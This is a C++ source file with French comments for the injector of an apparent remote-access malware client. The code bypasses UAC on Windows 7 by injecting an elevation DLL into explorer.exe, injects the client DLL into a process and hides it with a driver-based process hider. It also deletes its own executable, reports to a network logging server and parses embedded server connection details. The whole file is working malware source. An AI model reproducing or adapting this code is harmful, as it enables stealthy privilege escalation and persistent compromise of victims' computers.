#include <windows.h>
#include <string>
#include <cstdlib>

#include <ElevatorDll32.hpp>
#include <ElevatorDll64.hpp>
#include <Elevator32.hpp>
#include <Elevator64.hpp>

#include "Inhibiter.hpp"
#include "ClientConfig.hpp"
#include <blaspheme/Blaspheme.hpp>
#include <common/Logger.hpp>
#include <malicious/Injector.hpp>
#include <malicious/ProcessHider.hpp>
#include <malicious/BinaryRessource.hpp>
#include <system/Uac.hpp>
#include <system/ThisProcess.hpp>
#include <system/System.hpp>
#include <system/ProcessManager.hpp>
#include <system/File.hpp>

using namespace std;
using namespace System;
using namespace Network;
using namespace Inhibiter;
using namespace Malicious;

void ExecuteCommand(InhibiterCore& injector, const string& command);
void Inject(InhibiterCore& injector, const string& inhibitorPath);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{	
    FUNC_LOG(__FUNCTION__);
	ThisProcess thisProcess;

	// le nom du programme doit apparaitre dans les messages de debug
    LOG.setHeader(thisProcess.getProgramName());
    
    // les informations de connexions vers le serveur se trouvent dans une chaine de 
    // caractere avec un certain format située dans l'exécutable
	// on va parser les infos de connexions à partir de la chaine
    /*
	string buffer = blaspheme;
    string ip_str;
    string port_str;
    buffer = buffer.substr(MARKER_SIZE, buffer.size()-2*MARKER_SIZE);
    istringstream iss(buffer);
    getline( iss, ip_str, SEPERATOR );
    getline( iss, port_str, SEPERATOR );
    Port port = 0;
    from_string(port_str, port);
    
    LOG.addObserver(new Common::LoggingNetwork(ip_str, port));
	*/
	LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
    InhibiterCore injector (thisProcess.getProgramPath());
    LOG << "Programme : " + thisProcess.getProgramPath();
    LOG << "Nombre d'arguments : " + to_string(thisProcess.getArgCount());
	
    // l'injecteur a plusieurs utilités en plus d'injecter bêtement
    // la dll dans un processus, il va servir aussi a exécuter
    // certaines commandes que la DLL ne peut pas faire
    switch(thisProcess.getArgCount())
    {
        case 1:
            // Pas d'argument au programme, on doit faire une injection
            Inject(injector, thisProcess.getArg(0));
			break;
        case 2:
            // Il y a un argument, c'est une commande demandée par la DLL
            ExecuteCommand(injector, thisProcess.getArg(1));
            break;
        default:
            // Il ne peut pas y avoir plus d'un argument
            LOG << "Nombre d'arguments errone.";
    }
	return EXIT_SUCCESS;
}

void ExecuteCommand(InhibiterCore& injector, const string& command)
{
    FUNC_LOG(__FUNCTION__);
	if(command == UNINSTALL_CMD)
    {
		LOG << "Uninstall command.";
        Sleep(1000);
        injector.uninstall();
        Malicious::DeleteMyself(INHIBITER_EXE_NAME, SELF_DELETE_CMD);
    }
    else if(command == SELF_DELETE_CMD)
    {
        LOG << "Self delete command.";
        Sleep(500);
		injector.finishUninstall();
    }
    else
    {
	    LOG << "Finalisation installation / Injecteur.";
        Sleep(300);
#ifndef INNOCENCE_DEBUG
		LOG << "Effacement de l'ancien executable : " + command;
        if(!DeleteFile(command.c_str()))
        {
			LOG << "Error code : " + to_string(GetLastError());
            FATAL_ERROR("Impossible d'effacer l'executable lors de l'installation");
        }
        else
#else
		 LOG << "En mode debug, pas d'effacement de l'ancien executable";
#endif
        {
			LOG << "Injection...";
			injector.inject();
#ifndef INNOCENCE_DEBUG
			LOG << "Camouflage du processus injecte.";
			try
			{
				ProcessHider hider;
				hider.hide(injector.getInjectedProcess());
			}
			catch(ProcessHider::DriverError&)
			{
				LOG << "Erreur du ProcessHider.";
			}
			catch(...)
			{
				LOG << "Erreur d'origine inconnue.";
			}
#else
			LOG << "Pas de camouflage de processus en mode debug";
#endif
		}
    }
}

void Inject(InhibiterCore& injector, const string& inhibitorPath)
{
    FUNC_LOG(__FUNCTION__);
	// soit le programme est lance une premiere fois
	LOG << "Identification du systeme d'exploitation.";
	switch(getSystemVersion())
	{
		case OS_WIN32_WINDOWS_VISTA:
			if(isUacActivated())
			{
				if(!isAdministrator())
				{
					LOG << "Elevation non supportee sur Windows Vista.";
					return;
				}
			}
			break;
		case OS_WIN32_WINDOWS_SEVEN:
			if(isUacActivated())
			{
				if(!isAdministrator())
				{
                    string currentPath = inhibitorPath;
	                System::GetFileDir(currentPath);
					LOG << "Vous n'etes pas administrateur. Tentative d'elevation.";

					BinaryRessource * elevatorDll = 0;
					BinaryRessource * elevator = 0;

					if(is64BitWindows())
					{
						elevatorDll = new BinaryRessource(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
					}
					else
					{
						elevatorDll = new BinaryRessource(ElevatorDll32, sizeof(ElevatorDll32), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
					}

					LOG << "Decouverte du PID d'explorer.exe";
					DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
					if(explorer_pid)
					{
						LOG << "Injection de la DLL d'elevation dans explorer.exe : " + to_string(explorer_pid);
						string elevatorArguments = currentPath+"\\"+string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+string(ELEVATOR_DLL_NAME) + " " + inhibitorPath;
						LOG << "Ligne de commande d'elevation " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
						
						Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
						elevatorProcess.wait();				
					}
					else
					{
						LOG << "explorer.exe ne peut pas etre injecte. Le processus n'existe pas.";
					}
					delete elevatorDll;
					delete elevator;
					return;
				}
			}
		default:
			LOG << "Vous etes administrateur!";
	}

	if(injector.installed())
	{
		LOG << "Injection...";
		injector.inject();
	}
	else
	{
		LOG << "Installation du client...";
		injector.install();
	}
}
